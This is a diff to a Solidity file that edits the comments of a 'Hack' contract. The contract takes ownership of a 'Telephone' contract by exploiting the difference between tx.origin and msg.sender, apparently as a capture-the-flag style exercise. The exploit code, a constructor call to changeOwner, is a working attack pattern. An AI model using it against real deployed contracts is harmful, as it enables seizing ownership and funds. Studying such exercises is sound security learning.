@@ -18,8 +18,10 @@ contract Telephone { // owner creates telephone
 
 contract Hack { // hacker changes the Telephone's owner by calling changeOwner() via Hack contract
     constructor(address _target) {
-        // tx.origin = msg.sender
-        // msg.sender = address(this)
-        Telephone(_target).changeOwner(msg.sender); // 
+        // The idea is that inside Telephone:
+        // tx.origin = msg.sender (attacker)
+        // msg.sender = Hack contract
+        // attacker becomes owner
+        Telephone(_target).changeOwner(msg.sender);
     }
 }
